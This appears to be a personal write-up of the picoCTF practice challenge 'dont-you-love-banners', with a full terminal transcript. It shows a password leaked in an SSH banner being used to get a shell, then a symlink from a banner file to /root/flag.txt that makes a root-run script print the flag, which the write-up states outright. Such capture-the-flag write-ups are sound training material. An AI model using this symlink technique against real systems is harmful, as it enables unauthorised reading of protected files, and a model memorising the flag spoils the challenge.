# picoGym Level 0437: dont-you-love-banners
Source: https://play.picoctf.org/practice/challenge/437

## Goal
Can you abuse the banner?<br>
The server has been leaking some crucial information on tethys.picoctf.net 51915. Use the leaked information to get to the server.<br>
To connect to the running application use nc tethys.picoctf.net 57612. From the above information abuse the machine and find the flag in the <b>/root directory</b>.

## What I learned
```
Description told you how to connect to nc on the 2 servers even though show one port
Banner abuse w/ symlink
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ nc tethys.picoctf.net 57612 ⌨️
*************************************
**************WELCOME****************
*************************************

what is the password? 
a ⌨️
Lol, good try, try again and good luck

# Leaked Site
AsianHacker-picoctf@webshell:~$ nc tethys.picoctf.net 51915 ⌨️
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234 👀

Protocol mismatch.

AsianHacker-picoctf@webshell:~$ nc tethys.picoctf.net 57612 ⌨️
*************************************
**************WELCOME****************
*************************************

what is the password? ⌨️
My_Passw@rd_@1234 ⌨️
What is the top cyber security conference in the world?
DEFCON ⌨️
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper ⌨️
player@challenge:~$ echo $SHELL ⌨️
echo $SHELL
/bin/bash
player@challenge:~$ ls -la ⌨️
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner 👀
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banner ⌨️
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text ⌨️
cat text
keep digging
player@challenge:~$ cd /root/ ⌨️
cd /root/
player@challenge:/root$ ls -la ⌨️
ls -la
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Aug 20 14:54 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt 👀
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py 👀
player@challenge:/root$ cat script.py ⌨️
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f: 👀
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ cd ⌨️
cd
player@challenge:~$ rm banner ⌨️
rm banner
player@challenge:~$ ln -s /root/flag.txt banner ⌨️
ln -s /root/flag.txt banner
player@challenge:~$ ls -la ⌨️                     
ls -la
total 16
drwxr-xr-x 1 player player   20 Aug 20 15:14 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Aug 20 15:14 banner -> /root/flag.txt 👀
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ ^C ⌨️ 
AsianHacker-picoctf@webshell:~$ nc tethys.picoctf.net 57612 ⌨️ 
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541} 🔐

what is the password? 
```

## Flag
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

## Continue
[Continue](./picoGym0035.md)